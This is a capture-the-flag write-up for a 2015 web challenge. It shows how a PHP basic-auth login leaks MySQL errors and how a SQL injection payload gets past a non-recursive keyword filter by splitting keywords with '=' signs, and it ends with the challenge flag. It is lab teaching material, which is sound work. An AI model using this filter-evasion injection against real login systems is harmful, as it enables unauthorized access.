# Cyber Security Challenge 2015: NSA

**Category:** Web Application Security
**Points:** 50
**Description:**

> We heard rumors that the website below is owned by the NSA. There doesn’t seem to be much to it though… Maybe it’s just a placeholder?
>
> URL: 37.187.249.84:20005

## Write-up

```bash
$ curl 'http://37.187.249.84:20005/robots.txt'
# robots.txt for Nviso Realm

User-agent: *
Disallow: /css
Disallow: /js
Disallow: /imgs
```

<http://37.187.249.84:20005/css/> uses basic access authentication and prompts for a username and password.

Although basic access is usually implemented by a .htaccess file, it can just as easily be implemented in PHP by using the correct headers. This basic access is vulnerable to a SQL injection attack. When submitting `"'` as the value for the login and password, the server returns the following response:
```
HTTP/1.1 401 Unauthorized
Date: Mon, 16 Mar 2015 10:38:03 GMT
Server: Apache/2.2.22 (Debian)
X-Powered-By: PHP/5.4.36-0+deb7u3
WWW-Authenticate: Basic realm="Nviso Realm"
Pragma: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"''' at line 1
Vary: Accept-Encoding
Content-Length: 13
Content-Type: text/html

Access Denied
```
This pragma header shows us a MySQL error. The login form is vulnerable, but it does use some input filtering. For example, all MySQL keywords are filtered, but it isn't done recursively. The following input will result in a valid login:
```sql
usr: ' UN=IO=N SEL=ECT * FR=OM usorers; # '
pwd: '
```
This works because the equals sign (=) is removed after the input filter checks for UNTION/SELECT or FROM.

The webserver returns `Congratulations! The flag is basic_auth_is_sooo_last_century`


## Other write-ups and resources

* none yet
